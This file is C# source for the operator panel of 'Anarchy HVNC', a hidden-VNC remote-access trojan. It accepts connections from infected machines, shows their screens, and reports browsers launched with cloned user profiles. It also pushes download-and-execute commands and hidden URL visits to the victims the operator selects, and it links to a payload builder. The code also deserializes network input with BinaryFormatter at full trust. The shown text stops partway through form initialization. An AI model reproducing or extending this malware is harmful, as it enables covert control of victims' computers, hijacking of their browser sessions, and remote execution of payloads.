using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using Siticone.UI.WinForms;

namespace Anarchy.HCS
{
    public class FrmMain : Form
    {
        public static List<TcpClient> _clientList;

        public static TcpListener _TcpListener;

        private Thread VNC_Thread;

        public static int SelectClient;

        public static bool bool_1;

        public static int int_2;

        public static string isadmin;

        public static string detecav;

        public static Random random = new Random();

        public int count;

        public static bool ispressed = false;

        private IContainer components;

        private ImageList imageList1;

        public StatusStrip statusStrip1;

        private ToolStripStatusLabel ClientsOnline;

        public ToolStripMenuItem HVNCListenBtn;

        private ToolStripMenuItem portToolStripMenuItem;

        private ToolStripTextBox HVNCListenPort;

        private ToolStripSeparator toolStripSeparator3;

        private ImageList imageList2;

        private ColumnHeader columnHeader3;

        public ListView HVNCList;

        private ColumnHeader columnHeader1;

        public Label PortStatus;

        private Guna2Panel guna2Panel2;

        private Label label1;

        public Guna2NumericUpDown hvncport;

        private PictureBox pictureBox1;

        public SiticoneOSToggleSwith TogglePort;

        private SiticoneControlBox siticoneControlBox4;

        private Guna2Elipse guna2Elipse1;

        private Guna2DragControl guna2DragControl1;

        private Guna2Elipse guna2Elipse2;

        private Guna2ContextMenuStrip contextMenuStrip1;

        private ToolStripMenuItem testToolStripMenuItem;

        private ToolStripMenuItem builderToolStripMenuItem;

        private Guna2Button guna2Button1;

        private ToolStripMenuItem remoteExecuteToolStripMenuItem;

        private ToolStripMenuItem closeConnectionToolStripMenuItem;

        private int _port { get; set; }

        public static string saveurl { get; set; }

        public static string MassURL { get; set; }

        public FrmMain(int port)
        {
            this._port = port;
            this.InitializeComponent();
        }

        public void Listenning()
        {
            checked
            {
                try
                {
                    FrmMain._clientList = new List<TcpClient>();
                    FrmMain._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(this.hvncport.Text));
                    FrmMain._TcpListener.Start();
                    FrmMain._TcpListener.BeginAcceptTcpClient(ResultAsync, FrmMain._TcpListener);
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (ex.Message.Contains("aborted"))
                        {
                            return;
                        }
                        IEnumerator enumerator;
                        enumerator = null;
                        while (true)
                        {
                            try
                            {
                                try
                                {
                                    enumerator = Application.OpenForms.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        Form form;
                                        form = (Form)enumerator.Current;
                                        if (form.Name.Contains("FrmVNC"))
                                        {
                                            form.Dispose();
                                        }
                                    }
                                }
                                finally
                                {
                                    if (enumerator is IDisposable)
                                    {
                                        (enumerator as IDisposable).Dispose();
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                continue;
                            }
                            break;
                        }
                        FrmMain.bool_1 = false;
                        this.HVNCListenBtn.Text = "Listen";
                        int num;
                        num = FrmMain._clientList.Count - 1;
                        for (int i = 0; i <= num; i++)
                        {
                            FrmMain._clientList[i].Close();
                        }
                        FrmMain._clientList = new List<TcpClient>();
                        FrmMain.int_2 = 0;
                        FrmMain._TcpListener.Stop();
                        this.ClientsOnline.Text = "Clients Online: 0";
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }

        public static string RandomNumber(int length)
        {
            return new string((from s in Enumerable.Repeat("0123456789", length)
                select s[FrmMain.random.Next(s.Length)]).ToArray());
        }

        public void ResultAsync(IAsyncResult iasyncResult_0)
        {
            try
            {
                TcpClient tcpClient;
                tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
                tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                FrmMain._TcpListener.BeginAcceptTcpClient(ResultAsync, FrmMain._TcpListener);
            }
            catch (Exception)
            {
            }
        }

        public void ReadResult(IAsyncResult iasyncResult_0)
        {
            TcpClient tcpClient;
            tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter;
                    binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    byte[] array;
                    array = new byte[8];
                    int num;
                    num = 8;
                    int num2;
                    num2 = 0;
                    while (num > 0)
                    {
                        int num3;
                        num3 = tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }
                    ulong num4;
                    num4 = BitConverter.ToUInt64(array, 0);
                    int num5;
                    num5 = 0;
                    byte[] array2;
                    array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6;
                        num6 = 0;
                        int num7;
                        num7 = array2.Length;
                        while (num7 > 0)
                        {
                            num5 = tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }
                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;
                        object objectValue;
                        objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
                        if (objectValue is string)
                        {
                            string[] array3;
                            array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    tcpClient.Close();
                                }
                                if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
                                {
                                    string text;
                                    try
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    catch
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    try
                                    {
                                        IPAddress address;
                                        address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
                                        string text2;
                                        text2 = new Ping().Send(address).RoundtripTime.ToString();
                                        ListViewItem lvi2;
                                        lvi2 = new ListViewItem(new string[10]
                                        {
                                            " " + text,
                                            array3[1].Replace(" ", null),
                                            array3[3],
                                            array3[2],
                                            array3[4],
                                            array3[6],
                                            array3[5],
                                            array3[7],
                                            array3[8],
                                            text2
                                        })
                                        {
                                            Tag = tcpClient,
                                            ImageKey = array3[3].ToString() + ".png"
                                        };
                                        this.HVNCList.Invoke((MethodInvoker)delegate
                                        {
                                            lock (FrmMain._clientList)
                                            {
                                                this.HVNCList.Items.Add(lvi2);
                                                this.HVNCList.Items[FrmMain.int_2].Selected = true;
                                                FrmMain._clientList.Add(tcpClient);
                                                FrmMain.int_2++;
                                                this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
                                                GC.Collect();
                                            }
                                        });
                                    }
                                    catch (Exception)
                                    {
                                        ListViewItem lvi;
                                        lvi = new ListViewItem(new string[10]
                                        {
                                            " " + text,
                                            array3[1].Replace(" ", null),
                                            array3[3],
                                            array3[2],
                                            array3[4],
                                            array3[6],
                                            array3[5],
                                            array3[7],
                                            array3[8],
                                            "N/A"
                                        })
                                        {
                                            Tag = tcpClient,
                                            ImageKey = array3[3].ToString() + ".png"
                                        };
                                        this.HVNCList.Invoke((MethodInvoker)delegate
                                        {
                                            lock (FrmMain._clientList)
                                            {
                                                this.HVNCList.Items.Add(lvi);
                                                this.HVNCList.Items[FrmMain.int_2].Selected = true;
                                                FrmMain._clientList.Add(tcpClient);
                                                FrmMain.int_2++;
                                                this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
                                                GC.Collect();
                                            }
                                        });
                                    }
                                }
                                else if (FrmMain._clientList.Contains(tcpClient))
                                {
                                    this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                                }
                                else
                                {
                                    tcpClient.Close();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        else if (FrmMain._clientList.Contains(tcpClient))
                        {
                            this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                        }
                        else
                        {
                            tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                    tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                }
                catch (Exception ex3)
                {
                    if (!ex3.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (FrmMain._clientList.Contains(tcpClient))
                            {
                                int NumberReceived;
                                for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
                                {
                                    if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
                                    {
                                        if (Application.OpenForms[NumberReceived].Visible)
                                        {
                                            base.Invoke((MethodInvoker)delegate
                                            {
                                                if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                                {
                                                    Application.OpenForms[NumberReceived].Close();
                                                }
                                            });
                                        }
                                        else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[NumberReceived].Close();
                                        }
                                    }
                                }
                                this.HVNCList.Invoke((MethodInvoker)delegate
                                {
                                    lock (FrmMain._clientList)
                                    {
                                        try
                                        {
                                            int index;
                                            index = FrmMain._clientList.IndexOf(tcpClient);
                                            FrmMain._clientList.RemoveAt(index);
                                            this.HVNCList.Items.RemoveAt(index);
                                            tcpClient.Close();
                                            FrmMain.int_2--;
                                            this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
                                        }
                                        catch (Exception)
                                        {
                                        }
                                    }
                                });
                            }
                            return;
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                    tcpClient.Close();
                }
            }
        }

        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {
            int hashCode;
            hashCode = tcpClient_0.GetHashCode();
            FrmVNC frmVNC;
            frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (object_2 is Bitmap)
            {
                frmVNC.VNCBoxe.Image = (Image)object_2;
            }
            else if (object_2 is string)
            {
                string[] array;
                array = Conversions.ToString(object_2).Split('|');
                string left;
                left = array[0];
                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
                }
                if (Operators.CompareString(left, "200", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "201", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
                }
                if (Operators.CompareString(left, "202", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "203", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
                }
                if (Operators.CompareString(left, "204", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "205", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
                }
                if (Operators.CompareString(left, "206", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "207", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
                }
                if (Operators.CompareString(left, "256", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
                }
                if (Operators.CompareString(left, "22", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
                    frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
                }
                if (Operators.CompareString(left, "23", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
                }
                if (Operators.CompareString(left, "24", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
                }
                if (Operators.CompareString(left, "25", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "26", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                Operators.CompareString(left, "719", TextCompare: false);
                if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
                {
                    Clipboard.SetText(array[1].ToString());
                }
            }
        }

        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
            checked
            {
                try
                {
                    if (this.HVNCList.SelectedItems.Count == 0)
                    {
                        MessageBox.Show("You have to select a client first!", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                    else
                    {
                        if (this.HVNCList.FocusedItem.Index == -1)
                        {
                            return;
                        }
                        int num;
                        num = Application.OpenForms.Count - 1;
                        while (true)
                        {
                            if (num >= 0)
                            {
                                if (Application.OpenForms[num].Tag == FrmMain._clientList[this.HVNCList.FocusedItem.Index])
                                {
                                    break;
                                }
                                num += -1;
                                continue;
                            }
                            FrmVNC obj;
                            obj = new FrmVNC
                            {
                                Name = "VNCForm:" + Conversions.ToString(FrmMain._clientList[this.HVNCList.FocusedItem.Index].GetHashCode()),
                                Tag = FrmMain._clientList[this.HVNCList.FocusedItem.Index]
                            };
                            this.HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                                .Replace("}", null)
                                .Replace(":", null)
                                .Remove(0, 1);
                            obj.Show();
                            return;
                        }
                        Application.OpenForms[num].Show();
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("You have to select a client first!", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }

        private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            if (!e.Item.Selected)
            {
                e.DrawDefault = true;
            }
        }

        private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
            }
            else
            {
                e.DrawDefault = true;
            }
        }

        private void HVNCListenBtn_Click_1(object sender, EventArgs e)
        {
            if (Operators.CompareString(this.PortStatus.Text, "Start Port", TextCompare: false) == 0)
            {
                this.PortStatus.Text = "Disable Port";
                this.HVNCListenPort.Enabled = false;
                this.VNC_Thread = new Thread(Listenning)
                {
                    IsBackground = true
                };
                FrmMain.bool_1 = true;
                this.VNC_Thread.Start();
                return;
            }
            IEnumerator enumerator;
            enumerator = null;
            while (true)
            {
                try
                {
                    try
                    {
                        enumerator = Application.OpenForms.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            Form form;
                            form = (Form)enumerator.Current;
                            if (form.Name.Contains("FrmVNC"))
                            {
                                form.Dispose();
                            }
                        }
                    }
                    finally
                    {
                        if (enumerator is IDisposable)
                        {
                            (enumerator as IDisposable).Dispose();
                        }
                    }
                }
                catch (Exception)
                {
                    continue;
                }
                break;
            }
            this.HVNCListenPort.Enabled = true;
            if (this.VNC_Thread != null)
            {
                this.VNC_Thread.Abort();
            }
            FrmMain.bool_1 = false;
            this.PortStatus.Text = "Start Port";
            this.HVNCList.Items.Clear();
            FrmMain._TcpListener.Stop();
            checked
            {
                int num;
                num = FrmMain._clientList.Count - 1;
                for (int i = 0; i <= num; i++)
                {
                    FrmMain._clientList[i].Close();
                }
                FrmMain._clientList = new List<TcpClient>();
                FrmMain.int_2 = 0;
                this.ClientsOnline.Text = "Clients Online: 0";
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            this.hvncport.Value = this._port;
            this.HVNCList.View = View.Details;
            this.HVNCList.HideSelection = false;
            this.HVNCList.OwnerDraw = true;
            this.HVNCList.BackColor = Color.FromArgb(24, 24, 24);
            this.HVNCList.DrawColumnHeader += delegate(object sender, DrawListViewColumnHeaderEventArgs e)
            {
                SolidBrush brush;
                brush = new SolidBrush(Color.FromArgb(46, 45, 46));
                e.Graphics.FillRectangle(brush, e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.Header.Text, e.Font, e.Bounds, Color.WhiteSmoke);
            };
            this.HVNCList.DrawItem += delegate(object sender, DrawListViewItemEventArgs e)
            {
                e.DrawDefault = true;
            };
            this.HVNCList.DrawSubItem += delegate(object sender, DrawListViewSubItemEventArgs e)
            {
                e.DrawDefault = true;
            };
            this.ClientsOnline.Text = "Clients Online: 0";
        }

        private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(Environment.ExitCode);
        }

        private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                new FrmURL().ShowDialog();
                if (!FrmMain.ispressed)
                {
                    return;
                }
                FrmVNC frmVNC;
                frmVNC = new FrmVNC();
                foreach (object selectedItem in this.HVNCList.SelectedItems)
                {
                    _ = selectedItem;
                    this.count = this.HVNCList.SelectedItems.Count;
                }
                for (int i = 0; i < this.count; i++)
                {
                    frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                    frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
                    frmVNC.hURL(FrmMain.saveurl);
                    frmVNC.Dispose();
                }
                MessageBox.Show("Operation Completed To Selected Clients: " + this.count, "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                FrmMain.ispressed = false;
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                base.Close();
            }
        }

        private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC;
            frmVNC = new FrmVNC();
            foreach (object selectedItem in this.HVNCList.SelectedItems)
            {
                _ = selectedItem;
                this.count = this.HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < this.count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
                frmVNC.KillChrome();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + this.count, "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC;
            frmVNC = new FrmVNC();
            foreach (object selectedItem in this.HVNCList.SelectedItems)
            {
                _ = selectedItem;
                this.count = this.HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < this.count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
                frmVNC.ResetScale();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + this.count, "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new FrmBuilder(Convert.ToInt32(this._port)).ShowDialog();
        }

        private void TogglePort_Click(object sender, EventArgs e)
        {
            if (Operators.CompareString(this.PortStatus.Text, "Start Port", TextCompare: false) == 0)
            {
                this.PortStatus.Text = "Disable Port";
                this.HVNCListenPort.Enabled = false;
                this.VNC_Thread = new Thread(Listenning)
                {
                    IsBackground = true
                };
                FrmMain.bool_1 = true;
                this.VNC_Thread.Start();
                return;
            }
            IEnumerator enumerator;
            enumerator = null;
            while (true)
            {
                try
                {
                    try
                    {
                        enumerator = Application.OpenForms.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            Form form;
                            form = (Form)enumerator.Current;
                            if (form.Name.Contains("FrmVNC"))
                            {
                                form.Dispose();
                            }
                        }
                    }
                    finally
                    {
                        if (enumerator is IDisposable)
                        {
                            (enumerator as IDisposable).Dispose();
                        }
                    }
                }
                catch (Exception)
                {
                    continue;
                }
                break;
            }
            this.HVNCListenPort.Enabled = true;
            if (this.VNC_Thread != null)
            {
                this.VNC_Thread.Abort();
            }
            FrmMain.bool_1 = false;
            this.PortStatus.Text = "Start Port";
            this.HVNCList.Items.Clear();
            FrmMain._TcpListener.Stop();
            checked
            {
                int num;
                num = FrmMain._clientList.Count - 1;
                for (int i = 0; i <= num; i++)
                {
                    FrmMain._clientList[i].Close();
                }
                FrmMain._clientList = new List<TcpClient>();
                FrmMain.int_2 = 0;
                this.ClientsOnline.Text = "Clients Online: 0";
            }
        }

        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                new FrmMassUpdate().ShowDialog();
                if (!FrmMain.ispressed)
                {
                    return;
                }
                FrmVNC frmVNC;
                frmVNC = new FrmVNC();
                foreach (object selectedItem in this.HVNCList.SelectedItems)
                {
                    _ = selectedItem;
                    this.count = this.HVNCList.SelectedItems.Count;
                }
                for (int i = 0; i < this.count; i++)
                {
                    frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                    frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
                    frmVNC.UpdateClient(FrmMain.MassURL);
                    frmVNC.Dispose();
                }
                MessageBox.Show("Operation Completed To Selected Clients: " + this.count, "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                FrmMain.ispressed = false;
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                base.Close();
            }
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    if (MessageBox.Show("Are you sure you want to close the connection?", "Anarchy HVNC", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                    {
                        return;
                    }
                    FrmVNC frmVNC;
                    frmVNC = new FrmVNC();
                    foreach (object selectedItem in this.HVNCList.SelectedItems)
                    {
                        _ = selectedItem;
                        this.count = this.HVNCList.SelectedItems.Count;
                    }
                    for (int i = 0; i < this.count; i++)
                    {
                        frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                        frmVNC.Tag = this.HVNCList.SelectedItems[i].Tag;
                        frmVNC.CloseClient();
                        frmVNC.Dispose();
                    }
                    MessageBox.Show("Operation Completed To Selected Clients: " + this.count, "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                base.Close();
            }
        }

        private void TogglePort_CheckedChanged(object sender, EventArgs e)
        {
            if (this.TogglePort.Checked)
            {
                this.hvncport.Enabled = false;
            }
            else if (!this.TogglePort.Checked)
            {
                this.hvncport.Enabled = true;
            }
        }

        private void siticoneControlBox3_Click(object sender, EventArgs e)
        {
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            base.Hide();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.ClientsOnline = new System.Windows.Forms.ToolStripStatusLabel();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.PortStatus = new System.Windows.Forms.Label();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.HVNCList = new System.Windows.Forms.ListView();
            this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
            this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
            this.contextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.testToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HVNCListenBtn = new System.Windows.Forms.ToolStripMenuItem();
            this.portToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HVNCListenPort = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
            this.label1 = new System.Windows.Forms.Label();
            this.hvncport = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.TogglePort = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2Elipse2 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.closeConnectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip1.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.guna2Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.hvncport).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.imageList1.ImageSize = new System.Drawing.Size(16, 16);
            this.imageList1.TransparentColor = System.Drawing.Color.Black;
            this.ClientsOnline.ForeColor = System.Drawing.Color.Gainsboro;
            this.ClientsOnline.LinkColor = System.Drawing.Color.Green;
            this.ClientsOnline.Name = "ClientsOnline";
            this.ClientsOnline.Size = new System.Drawing.Size(101, 17);
            this.ClientsOnline.Text = "Clients Online: 0";
            this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.statusStrip1.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ClientsOnline });
            this.statusStrip1.Location = new System.Drawing.Point(0, 499);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(1088, 22);
            this.statusStrip1.SizingGrip = false;
            this.statusStrip1.TabIndex = 4;
            this.statusStrip1.Text = "statusStrip1";
            this.PortStatus.AutoSize = true;
            this.PortStatus.BackColor = System.Drawing.Color.FromArgb(8, 104, 81);
            this.PortStatus.ForeColor = System.Drawing.Color.White;
            this.PortStatus.Location = new System.Drawing.Point(778, 587);
            this.PortStatus.Name = "PortStatus";
            this.PortStatus.Size = new System.Drawing.Size(51, 13);
            this.PortStatus.TabIndex = 146;
            this.PortStatus.Text = "Start Port";
            this.PortStatus.Visible = false;
            this.imageList2.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.imageList2.ImageSize = new System.Drawing.Size(16, 16);
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.HVNCList.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.HVNCList.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader3, this.columnHeader1 });
            this.HVNCList.ContextMenuStrip = this.contextMenuStrip1;
            this.HVNCList.Dock = System.Windows.Forms.DockStyle.Fill;
            this.HVNCList.ForeColor = System.Drawing.Color.Gainsboro;
            this.HVNCList.FullRowSelect = true;
            this.HVNCList.HideSelection = false;
            this.HVNCList.LabelEdit = true;
            this.HVNCList.Location = new System.Drawing.Point(0, 41);
